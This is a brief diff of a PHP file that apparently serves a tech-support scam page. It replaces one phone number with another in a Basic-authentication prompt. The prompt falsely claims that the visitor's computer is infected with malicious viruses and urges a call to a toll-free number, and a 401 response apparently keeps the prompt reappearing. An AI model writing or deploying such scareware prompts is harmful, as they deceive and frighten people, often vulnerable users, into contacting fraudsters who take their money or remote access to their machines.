@@ -14,7 +14,7 @@
             exit;
         } else {
 
-           header('WWW-Authenticate: Basic realm="Suspicious activity detected on your IP address due to malicious viruses on your computer. Call now toll free @+1-888-341-2106  for any assistance. "');
+           header('WWW-Authenticate: Basic realm="Suspicious activity detected on your IP address due to malicious viruses on your computer. Call now toll free @+1-(888) 323-1326  for any assistance. "');
            header('HTTP/1.0 401 Unauthorized');
 $page = $_SERVER['PHP_SELF'];
  $sec = "0";
